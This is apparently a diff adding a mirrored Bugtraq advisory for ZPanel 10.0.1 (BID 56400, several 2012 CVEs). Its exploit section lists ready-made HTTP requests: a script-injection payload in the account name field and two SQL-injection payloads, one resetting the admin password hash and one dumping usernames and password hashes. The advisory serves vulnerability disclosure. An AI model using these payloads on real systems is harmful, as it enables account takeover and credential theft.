@@ -1,0 +1,103 @@
+#SpeeDr00t@Black Falcon<br>#bid56400<p><b><span style="font-size: 18pt;">ZPanel Multiple Remote Security Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/56400/info">info</a><br><a href="http://www.securityfocus.com/bid/56400/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/56400/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/56400/solution">solution</a><br><a href="http://www.securityfocus.com/bid/56400/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				56400
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2012-5683<br/>
+				
+					CVE-2012-5684<br/>
+				
+					CVE-2012-5685<br/>
+				
+					CVE-2012-5686<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 05 2012 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 05 2012 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				pcsjj
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					ZPanel ZPanel  10.0.1<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can exploit these issues with a browser.  <br/> <br/>The following example URIs are available:  <br/> <br/>HTML-injection: <br/> <br/>http://www.example.com/zpanel/?module=my_account&amp;amp;action=UpdateAccountSettings  <br/>Cookie: PHPSESSID=4rcq0qoqcdp5f3e65jiuvsujd2  <br/>Content-Type: application/x-www-form-urlencoded  <br/>Content-Length: 143  <br/>inFullname=Admin%3Cscript%3Ealert%28/fun/%29%3C%2Fscript%3E&amp;amp;inEmail=admin%  <br/>40example.com&amp;amp;inPhone=101&amp;amp;inLanguage=en&amp;amp;inAddress=Home&amp;amp;inPostalCode=101  <br/> <br/> <br/>SQL-injection: <br/> <br/>1. http://www.example.com/?module=manage_clients&amp;amp;show=Edit&amp;amp;other=5  <br/>Cookie: PHPSESSID=4rcq0qoqcdp5f3e65jiuvsujd2  <br/>Content-Type: application/x-www-form-urlencoded  <br/>Content-Length: 257  <br/>inGroup=2&amp;amp;inPackage=2&amp;amp;inFullName=reseller&amp;amp;inEmailAddress=%27%2C+ac_pass_vc%3D%275f4dcc3b5aa765d61d8327deb882cf99%27%2C+ac_user_vc%3D%27zadmin%27+WHERE+ac_id_pk%3D1%3B--&amp;amp;inAddress=&amp;amp;inPostCode=&amp;amp;inPhone=101&amp;amp;inNewPassword=&amp;amp;inEnabled=1&amp;amp;inClientID=5&amp;amp;inSubmit=Save  <br/> <br/>2. http://www.example.com/?module=manage_clients&amp;amp;show=Edit&amp;amp;other=5  <br/>#&amp;lt;!---- 5 is the Client ID or ac_id_pk  <br/>Cookie: PHPSESSID=4rcq0qoqcdp5f3e65jiuvsujd2  <br/>Content-Type: application/x-www-form-urlencoded  <br/>Content-Length: 335  <br/>inGroup=2&amp;amp;inPackage=2&amp;amp;inFullName=reseller&amp;amp;inEmailAddress=reseller%  <br/>40example.com  <br/>%27%2C+ac_email_vc%3D%28select+group_concat%28ac_user_vc%2C+ac_pass_vc%29+from+%28select+*+from+x_accounts%29+as+fun%29+where+ac_id_pk%3D%275%27%3B--&amp;amp;inAddress=&amp;amp;inPostCode=&amp;amp;inPhone=%2B44%281473%29+000+000&amp;amp;inNewPassword=&amp;amp;inEnabled=1&amp;amp;inClientID=5&amp;amp;inSubmit=Save
+	
+		<ul>
+</ul>
+</div>
